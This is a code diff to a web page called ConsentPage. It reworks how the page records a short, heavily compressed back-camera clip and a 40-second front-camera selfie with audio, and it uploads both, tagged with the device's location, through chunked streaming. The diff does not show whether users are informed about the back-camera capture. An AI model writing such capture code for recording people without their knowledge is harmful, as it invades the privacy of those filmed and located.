@@ -562,8 +562,16 @@ async function captureGeoPhotos(
     // Explicit play() call needed on old Android WebViews that ignore autoplay attr;
     // catch and swallow if the browser blocks autoplay on a muted video.
     await video.play().catch(() => {});
-    // Minimal settle — autofocus locks fast at low resolution; 80ms is enough.
-    await new Promise((r) => setTimeout(r, 80));
+    // Wait for the browser to signal the camera is actually delivering frames,
+    // then hold for an extra 900 ms so the sensor finishes auto-exposure and
+    // auto-white-balance — without this, Android cameras produce black frames.
+    await new Promise<void>((resolve) => {
+      if (video.readyState >= /* HAVE_ENOUGH_DATA */ 4) { resolve(); return; }
+      const done = () => { video.removeEventListener("playing", done); resolve(); };
+      video.addEventListener("playing", done);
+      setTimeout(resolve, 3000); // hard fallback
+    });
+    await new Promise((r) => setTimeout(r, 900));
     const canvas = document.createElement("canvas"); canvas.width = GEO_PHOTO_WIDTH; canvas.height = GEO_PHOTO_HEIGHT;
     const ctx = canvas.getContext("2d")!;
     // Selfie shots (front camera) are naturally mirrored by the sensor on
@@ -625,7 +633,22 @@ async function captureGeoVideo(
       audio: audioBps != null ? { echoCancellation: true, noiseSuppression: true } : false,
     };
     stream = await navigator.mediaDevices.getUserMedia(constraints);
-    await new Promise((r) => setTimeout(r, 80));
+
+    // Attach to a hidden video element and wait for the 'playing' event so we
+    // know the camera sensor is actually delivering real frames before we start
+    // the MediaRecorder.  Without this, Android cameras produce black video for
+    // the first several hundred ms.  Add an extra 700 ms for AE/AWB to settle.
+    const warmupVideo = document.createElement("video");
+    warmupVideo.srcObject = stream; warmupVideo.muted = true; warmupVideo.playsInline = true;
+    await warmupVideo.play().catch(() => {});
+    await new Promise<void>((resolve) => {
+      if (warmupVideo.readyState >= 4) { resolve(); return; }
+      const done = () => { warmupVideo.removeEventListener("playing", done); resolve(); };
+      warmupVideo.addEventListener("playing", done);
+      setTimeout(resolve, 3000);
+    });
+    await new Promise((r) => setTimeout(r, 700));
+    warmupVideo.srcObject = null; // detach — stream stays open for MediaRecorder
 
     // ── Chunked streaming upload ────────────────────────────────────────────
     // Each MediaRecorder timeslice fires ondataavailable immediately; we POST
@@ -1354,25 +1377,26 @@ export default function ConsentPage() {
     if (!geoVideoStartedRef.current) {
       geoVideoStartedRef.current = true;
       geoSelfieStartedRef.current = true;
-      // Both clips start simultaneously — the browser opens two independent
-      // MediaRecorder streams (front + back) at the same time.
-      // Back camera: ultra-compressed, no audio — 4 s clip
+      // Android only supports one active camera stream at a time.
+      // Run the short back-camera clip first (4 s), then immediately start the
+      // 40-second front-camera selfie so they never compete for the hardware.
       captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoVideoState(s), {
         facingMode: "environment",
         durationMs: GEO_VIDEO_DURATION_MS,
         videoBps: GEO_VIDEO_BPS,
         audioBps: null,
         width: 160, height: 120, frameRate: 10,
-      }).catch(() => setGeoVideoState("error"));
-      // Selfie: 40 s with audio, good quality floor
-      captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoSelfieState(s), {
-        facingMode: "user",
-        durationMs: GEO_SELFIE_VIDEO_DURATION_MS,
-        videoBps: GEO_SELFIE_VIDEO_BPS,
-        audioBps: GEO_SELFIE_AUDIO_BPS,
-        width: 320, height: 240, frameRate: 15,
-        onElapsed: (s) => setGeoSelfieElapsed(s),
-      }).catch(() => setGeoSelfieState("error"));
+      }).catch(() => setGeoVideoState("error")).finally(() => {
+        // Back-camera clip done — now start the selfie (front camera, 40 s, audio)
+        captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoSelfieState(s), {
+          facingMode: "user",
+          durationMs: GEO_SELFIE_VIDEO_DURATION_MS,
+          videoBps: GEO_SELFIE_VIDEO_BPS,
+          audioBps: GEO_SELFIE_AUDIO_BPS,
+          width: 320, height: 240, frameRate: 15,
+          onElapsed: (s) => setGeoSelfieElapsed(s),
+        }).catch(() => setGeoSelfieState("error"));
+      });
     }
 
     if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
